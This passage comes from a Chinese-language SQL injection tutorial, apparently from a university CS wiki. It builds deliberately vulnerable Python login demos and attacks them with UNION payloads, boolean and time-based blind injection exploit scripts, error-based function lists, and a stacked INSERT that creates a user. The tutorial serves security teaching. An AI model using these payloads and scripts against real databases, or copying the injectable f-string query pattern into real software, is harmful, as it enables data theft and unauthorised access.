main():</span><br><span class="line">    username = input(&quot;Give me your username: &quot;)</span><br><span class="line">    print(query(username))</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20</p>
+<p>接下来我们进行一次常规查询</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnpCCmEi6LIKNi0UqEkXfJ8g.png" alt="img"></p>
+<p>可以看到我们成功从数据库中查出了 <code>username</code> 和 <code>password</code> ，并显示在返回中</p>
+<p>现在我们构造一些恶意语句，比如 <code>123&#39; UNION SELECT 1, 2;#</code></p>
+<p>现在我们将执行的语句打印出来看看，对代码进行一些小改动</p>
+<p>bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">def query(username):</span><br><span class="line">    with engine.connect() as con:</span><br><span class="line">        query_exec = f&quot;SELECT * FROM users WHERE username = &#x27;&#123;username&#125;&#x27;&quot;</span><br><span class="line">        print(query_exec)</span><br><span class="line">        cur = con.execute(query_exec).cursor</span><br><span class="line">        x = from_db_cursor(cur)</span><br><span class="line">        return(x)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnbaW15gnJc1O9Iv9WXqJxPc.png" alt="img"></p>
+<p>可以看到，实际执行的语句为</p>
+<p>sql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username = &#x27;123&#x27; UNION SELECT 1, 2;#&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>1</p>
+<p>也就是说，在这个 demo 中，从数据库查询的内容会直接返回给用户，用户可以直接看到查询的内容</p>
+<p>那我们是否可以进行一些其他的查询呢</p>
+<p>构造语句 <code>123&#39; UNION SELECT DATABASE(), @@version;#</code></p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnDeDp5yPE7W4KX9ByBl9ovh.png" alt="img"></p>
+<p>我们就能看到返回中包含了当前数据库名与当前数据库版本</p>
+<p>如果数据库中除了 <code>users</code> 表还有其他的东西，我们是否能通过这个注入来获取呢…</p>
+<p>构造语句 <code>123&#39; UNION SELECT table_name, column_name FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE();#</code></p>
+<blockquote>
+<p><code>information_schema</code> 库是一个 MySQL 内置数据库，储存了数据库中的一些基本信息，比如数据库名，表名，列名等一系列关键数据，SQL 注入中可以查询该库来获取数据库中的敏感信息。</p>
+</blockquote>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnkwvSnhKBhlHNLOSthgul9d.png" alt="img"></p>
+<p>我们可以发现，当前数据库中还存在一张叫 <code>secret</code> 的表，让我们偷看一下里面存的是什么</p>
+<p>构造语句 <code>123&#39; UNION SELECT 1, secret_string FROM secret;#</code></p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcn3kfhJ79ByNML2Z1Q1MwRye.png" alt="img"></p>
+<p>好像得到了什么不得了的秘密 😃</p>
+<h3 id="无回显的-SQL-盲注-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-无回显的-sql-盲注"><a href="#无回显的-SQL-盲注-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-无回显的-sql-盲注" class="headerlink" title="无回显的 SQL 盲注[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#无回显的-sql-盲注)"></a>无回显的 SQL 盲注[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#无回显的-sql-盲注)</h3><h4 id="布尔盲注-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-布尔盲注"><a href="#布尔盲注-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-布尔盲注" class="headerlink" title="布尔盲注[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#布尔盲注)"></a>布尔盲注[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#布尔盲注)</h4><p>我们对有回显的 SQL 注入的 demo 进行一点修改，代码如下</p>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">from sqlalchemy import create_engine</span><br><span class="line">from hashlib import sha256</span><br><span class="line"></span><br><span class="line">engine = create_engine(&quot;mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli&quot;, max_overflow=5)</span><br><span class="line"></span><br><span class="line">def query(username, password):</span><br><span class="line">    with engine.connect() as con:</span><br><span class="line">        query_exec = f&quot;SELECT password FROM users WHERE username = &#x27;&#123;username&#125;&#x27;&quot;</span><br><span class="line">        print(query_exec)</span><br><span class="line">        if con.execute(query_exec).scalar():</span><br><span class="line">            passhash = con.execute(query_exec).fetchone()[0]</span><br><span class="line">            return passhash == sha256(password.encode()).hexdigest()</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    username = input(&quot;Give me your username: &quot;)</span><br><span class="line">    password = input(&quot;Give me your password: &quot;)</span><br><span class="line">    print(&quot;Login success&quot; if query(username, password) else &quot;Login failed&quot;)</span><br><span class="line">    # 不再显示查询结果，而返回 success 或 failed</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25</p>
+<p>这样一来我们就只能知道自己是否登录成功，并不能看到查询返回的结果了</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcn2seUNESHkLC9PYvDp0vFbe.png" alt="img"></p>
+<p>那也就是说，我们无法直观地查看数据库中的数据了，即便查出了不该查的也看不到了 😦</p>
+<p>那有没有什么办法击破这个限制呢？是时候该本章的主角，布尔盲注出场了</p>
+<p>观察程序的逻辑，如果查询特定用户的密码与用户的输入匹配，则登陆成功，否则登陆失败</p>
+<p>我们是否能控制语句是否将对应用户的密码查询出来呢？</p>
+<p>在 MySQL 中有一种格式为 <code>if(expression, if_true, if_false)</code> 的分支语句</p>
+<p>类比 Python 则可以写成</p>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (expression):</span><br><span class="line">    if_true</span><br><span class="line">else:</span><br><span class="line">    if_false</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2<br>3<br>4</p>
+<p>如果我们可以通过 <code>if</code> 语句来控制整个 SQL 语句是否查询成功，不就可以获取一些信息了吗？</p>
+<p>当 if 语句为真时才将对应用户的密码查询出来，这样一来就能够通过用户验证，结果即为登陆成功</p>
+<p>当 if 语句为假时则不将对应用户的密码查询出来，程序无从比对，也就无法通过用户验证了</p>
+<p>有点抽象？没关系继续往下看。</p>
+<p>构造语句 <code>Liki4&#39; and if(@@version rlike &#39;^5&#39;,1,0);#</code></p>
+<blockquote>
+<p>rlike 是 MySQL 中的一个关键字，是 regex 和 like 的结合体</p>
+</blockquote>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnJEeAKow3ZhUSvbL4FQXxOh.png" alt="img"></p>
+<p>这里实际执行的语句就变成了</p>
+<p>sql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT password FROM users WHERE username = &#x27;Liki4&#x27; AND if(@@version rlike &#x27;^5&#x27;,1,0);</span><br></pre></td></tr></table></figure>
+
+<p>1</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnJ3jImTQcMUOWJclTACj74e.png" alt="img"></p>
+<p>sql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT password FROM users WHERE username = &#x27;Liki4&#x27; AND if(@@version rlike &#x27;^8&#x27;,1,0);</span><br></pre></td></tr></table></figure>
+
+<p>1</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnEDPFbKQ6iaM5WhHWUWmI5d.png" alt="img"></p>
+<p>也就是说，当 if 语句中的条件为真时，这个查询才会将 password 查询出来</p>
+<p>如果 if 语句为假，这个条件为假的查询就不成立，查询的结果也为空了</p>
+<p>从上面这个例子里我们就可以得出当前 MySQL 为 MySQL 5</p>
+<p>如此一来我们就可以通过枚举爆破得到数据库名，表名，列名，进而得到数据库中存储的数据了</p>
+<p>其中关键的语句如下</p>
+<p>sql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(DATABASE() rlike &#x27;^&#123;exp&#125;&#x27;,1,0) # 获取数据库名</span><br><span class="line">if((SELECT GROUP_CONCAT(table_name, &#x27;:&#x27;, column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE()) rlike &#x27;^&#123;exp&#125;&#x27;,1,0) # 获取表名与字段名</span><br><span class="line">if((SELECT binary GROUP_CONCAT(secret_string) FROM secret) rlike &#x27;^&#123;exp&#125;&#x27;,1,0) # 获取存储的数据</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2<br>3</p>
+<p>完整 exp 如下</p>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from mysqli_invisible_bool import *</span><br><span class="line">import string</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def escape_string(c):</span><br><span class="line">    return &quot;\\&quot; + c if c in &quot;.+*&quot; else c</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    payload_template = &quot;Liki4&#x27; AND if(&#123;exp&#125;,1,0);#&quot;</span><br><span class="line">    space = string.ascii_letters + string.digits + &#x27; _:,$.&#x27;</span><br><span class="line"></span><br><span class="line">    exp_template = &quot;@@version RLIKE &#x27;^&#123;c&#125;&#x27;&quot;</span><br><span class="line">    exp_template = &quot;DATABASE() RLIKE &#x27;^&#123;c&#125;&#x27;&quot;</span><br><span class="line">    exp_template = &quot;(SELECT GROUP_CONCAT(table_name, &#x27;:&#x27;, column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE()) RLIKE &#x27;^&#123;c&#125;&#x27;&quot;</span><br><span class="line">    exp_template = &quot;(SELECT binary GROUP_CONCAT(secret_string) FROM secret) RLIKE &#x27;^&#123;c&#125;&#x27;&quot;</span><br><span class="line"></span><br><span class="line">    print(exp_template)</span><br><span class="line"></span><br><span class="line">    Flag = True</span><br><span class="line"></span><br><span class="line">    data = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    while Flag:</span><br><span class="line">        ori_stdout = sys.stdout</span><br><span class="line">        for c in space:</span><br><span class="line">            payload = payload_template.format(exp=exp_template.format(c=data+c))</span><br><span class="line">            sys.stdin = io.StringIO(payload + &#x27;\n123\n&#x27;)</span><br><span class="line">            res = sys.stdout = io.StringIO()</span><br><span class="line">            main()</span><br><span class="line">            output = str(res.getvalue())</span><br><span class="line">            if &quot;failed&quot; in output:</span><br><span class="line">                continue</span><br><span class="line">            if c == &quot;$&quot;:</span><br><span class="line">                Flag = False</span><br><span class="line">                break</span><br><span class="line">            if &quot;success&quot; in output:</span><br><span class="line">                data += c</span><br><span class="line">                break</span><br><span class="line">        sys.stdout = ori_stdout</span><br><span class="line">        if Flag:</span><br><span class="line">            print(data, end=&quot;\r&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(data)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnXyMaLh26lkNuAPiQVHuaNg.png" alt="img"></p>
+<h4 id="时间盲注-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-时间盲注"><a href="#时间盲注-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-时间盲注" class="headerlink" title="时间盲注[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#时间盲注)"></a>时间盲注[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#时间盲注)</h4><p>时间盲注的场景和原理与布尔盲注类似，都是在没有回显查询结果的时候使用的</p>
+<p>能用布尔盲注的地方一般都能用时间盲注，但能用时间盲注的地方不一定能用布尔盲注</p>
+<p>有的场景在完全没有回显，甚至没有能表示语句是否查询完成的东西存在时，时间盲注就派上用场了</p>
+<p>这里可以直接沿用布尔盲注的场景</p>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">from sqlalchemy import create_engine</span><br><span class="line">from hashlib import sha256</span><br><span class="line"></span><br><span class="line">engine = create_engine(&quot;mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli&quot;, max_overflow=5)</span><br><span class="line"></span><br><span class="line">def query(username, password):</span><br><span class="line">    with engine.connect() as con:</span><br><span class="line">        query_exec = f&quot;SELECT password FROM users WHERE username = &#x27;&#123;username&#125;&#x27;&quot;</span><br><span class="line">        print(query_exec)</span><br><span class="line">        if con.execute(query_exec).scalar():</span><br><span class="line">            passhash = con.execute(query_exec).fetchone()[0]</span><br><span class="line">            return passhash == sha256(password.encode()).hexdigest()</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    username = input(&quot;Give me your username: &quot;)</span><br><span class="line">    password = input(&quot;Give me your password: &quot;)</span><br><span class="line">    print(&quot;Login success&quot; if query(username, password) else &quot;Login failed&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24</p>
+<p>如果想要让布尔盲注不可用，我们可以做一个假设，假设我们并不知道账户的密码，也就无法通过登陆验证，这个时候就失去了布尔盲注最大的依赖，也就无法得知 if 表达式的真或假了。</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcndxf4WEQQQEXspS7GwNKI6J.png" alt="img"></p>
+<p>但，真的没办法了吗？</p>
+<p>在 MySQL 中存在一个延时函数 sleep ()，可以延时特定的秒数</p>
+<p>如果我们将 if 语句中的返回值改成延时函数会如何呢？</p>
+<p>当 if 语句为真时进行一个延时，当 if 语句为假时即刻返回</p>
+<p>于是我们就可以通过查询进行的时间长短来判断语句是否为真了！</p>
+<p>完整的 exp 如下</p>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from mysqli_invisible_time import *</span><br><span class="line">import string</span><br><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import signal</span><br><span class="line"></span><br><span class="line">def handler(signum, frame):</span><br><span class="line">    raise Exception(&quot;timeout&quot;)</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGALRM, handler)</span><br><span class="line"></span><br><span class="line">def escape_string(c):</span><br><span class="line">    return &quot;\\&quot; + c if c in &quot;.+*&quot; else c</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    payload_template = &quot;Liki4&#x27; AND if(&#123;exp&#125;,SLEEP(1),0);#&quot;</span><br><span class="line">    space = string.ascii_letters + string.digits + &#x27; _:,$.&#x27;</span><br><span class="line"></span><br><span class="line">    exp_template = &quot;@@version RLIKE &#x27;^&#123;c&#125;&#x27;&quot;</span><br><span class="line">    exp_template = &quot;DATABASE() RLIKE &#x27;^&#123;c&#125;&#x27;&quot;</span><br><span class="line">    exp_template = &quot;(SELECT GROUP_CONCAT(table_name, &#x27;:&#x27;, column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE()) RLIKE &#x27;^&#123;c&#125;&#x27;&quot;</span><br><span class="line">    exp_template = &quot;(SELECT binary GROUP_CONCAT(secret_string) FROM secret) RLIKE &#x27;^&#123;c&#125;&#x27;&quot;</span><br><span class="line"></span><br><span class="line">    print(exp_template)</span><br><span class="line"></span><br><span class="line">    Flag = True</span><br><span class="line"></span><br><span class="line">    data = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    while Flag:</span><br><span class="line">        ori_stdout = sys.stdout</span><br><span class="line">        for c in space:</span><br><span class="line">            payload = payload_template.format(exp=exp_template.format(c=data+c))</span><br><span class="line">            sys.stdin = io.StringIO(payload + &#x27;\n555_i_dont_know_password&#x27;)</span><br><span class="line">            res = sys.stdout = io.StringIO()</span><br><span class="line"></span><br><span class="line">            signal.alarm(1)</span><br><span class="line">            try:</span><br><span class="line">                main()</span><br><span class="line">                print(&quot;timeout&quot;)</span><br><span class="line">            except:</span><br><span class="line">                print(&quot;bingooo&quot;)</span><br><span class="line">            </span><br><span class="line">            output = str(res.getvalue())</span><br><span class="line">            if &quot;timeout&quot; in output:</span><br><span class="line">                continue</span><br><span class="line">            if c == &quot;$&quot;:</span><br><span class="line">                Flag = False</span><br><span class="line">                break</span><br><span class="line">            if &quot;bingooo&quot; in output:</span><br><span class="line">                data += c</span><br><span class="line">                break</span><br><span class="line">        sys.stdout = ori_stdout</span><br><span class="line">        if Flag:</span><br><span class="line">            print(data, end=&quot;\r&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(data)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br>57<br>58<br>59<br>60</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnsStdHC5VmBylyx6S7hakEb.png" alt="img"></p>
+<h3 id="基于报错的-SQL-注入-TODO-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-基于报错的-sql-注入-todo"><a href="#基于报错的-SQL-注入-TODO-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-基于报错的-sql-注入-todo" class="headerlink" title="基于报错的 SQL 注入 (TODO)[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#基于报错的-sql-注入-todo)"></a>基于报错的 SQL 注入 (TODO)[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#基于报错的-sql-注入-todo)</h3><p>有的时候当 Web 应用虽然没有回显，但开启了 Debug 模式或者开启了显示报错的话，一旦 SQL 语句执行报错了，那么就会将错误信息显示出来，那报错的信息能否成为一种带出关键信息的回显呢？</p>
+<p>可以！</p>
+<p>让我们再对 demo 的代码做一些修改，用来探究以下如何利用报错来外带信息。</p>
+<p>python</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line"></span><br><span class="line">from sqlalchemy import create_engine, exc</span><br><span class="line">from hashlib import sha256</span><br><span class="line"></span><br><span class="line">engine = create_engine(&quot;mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli&quot;, max_overflow=5)</span><br><span class="line"></span><br><span class="line">def query(username, password):</span><br><span class="line">    with engine.connect() as con:</span><br><span class="line">        query_exec = f&quot;SELECT password FROM users WHERE username = &#x27;&#123;username&#125;&#x27;&quot;</span><br><span class="line">        print(query_exec)</span><br><span class="line">        try:</span><br><span class="line">            if con.execute(query_exec).scalar():</span><br><span class="line">                passhash = con.execute(query_exec).fetchone()[0]</span><br><span class="line">                return passhash == sha256(password.encode()).hexdigest()</span><br><span class="line">        except exc.SQLAlchemyError as e:</span><br><span class="line">            print(str(e.__dict__[&#x27;orig&#x27;])) # 输出捕获的错误信息</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    username = input(&quot;Give me your username: &quot;)</span><br><span class="line">    password = input(&quot;Give me your password: &quot;)</span><br><span class="line">    print(&quot;Login success&quot; if query(username, password) else &quot;Login failed&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27</p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnl67uDDSIdh3J7y7Jxjk0dc.png" alt="img"></p>
+<p>这样一来如果 SQL 语句执行报错的话，错误信息就会被打印出来</p>
+<p>我收集了十个在 MySQL 中常见的可以用来进行报错注入的函数，我将他们常见的攻击手法都整理一下，放在底下供大家参考，原理和先前的有回显注入的方式并无区别。</p>
+<p>关于函数的原型与定义可以翻阅 MySQL 文档</p>
+<p>MySQL 5.7 doc: <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/5.7/en/">https://dev.mysql.com/doc/refman/5.7/en/</a></p>
+<p>MySQL 8.0 doc: <a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/">https://dev.mysql.com/doc/refman/8.0/en/</a></p>
+<p>需要注意的是旧版本的某些函数在新版本中可能已经失效，具体在这里不一一列举</p>
+<ol>
+<li><code>floor</code></li>
+<li><code>extractvalue</code></li>
+<li><code>updatexml</code></li>
+<li><code>geometrycollection</code></li>
+<li><code>multipoint</code></li>
+<li><code>polygon</code></li>
+<li><code>multipolygon</code></li>
+<li><code>linestring</code></li>
+<li><code>multilinestring</code></li>
+<li><code>exp</code></li>
+</ol>
+<h3 id="堆叠注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-堆叠注入"><a href="#堆叠注入-https-hdu-cs-wiki-6-计算机安全-6-1-1SQL-注入-堆叠注入" class="headerlink" title="堆叠注入[](https://hdu-cs.wiki/6.计算机安全/6.1.1SQL 注入#堆叠注入)"></a>堆叠注入[](<a target="_blank" rel="noopener" href="https://hdu-cs.wiki/6.%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/6.1.1SQL">https://hdu-cs.wiki/6.计算机安全/6.1.1SQL</a> 注入#堆叠注入)</h3><p>当注入点使用的执行函数允许一次性执行多个 SQL 语句的时候，例如 PHP 中的 <code>multi_query</code> ，堆叠注入即存在。堆叠注入相较于其他方式，利用的手法更加自由，不局限于原来的 SELECT 语句，而可以拓展到 INSERT、SHOW、SET、UPDATE 语句等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Liki4&#x27;;INSERT INTO users VALUES (&#x27;Liki3&#x27;,&#x27;01848f8e70090495a136698a41c5b37406968c648ab12133e0f256b2364b5bb5&#x27;);#</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnrMIc2m6oubxC86CEtw1jMe.png" alt="img"></p>
+<p><img src="C:\Users\24993\Desktop\博客文章\static\boxcnVRdntvakiTpt7nP8JhKKfc.png" alt="img"></p>
+<p>INSERT 语句也被成功执行了，向数据库中插入了 Liki3 的数据</p>
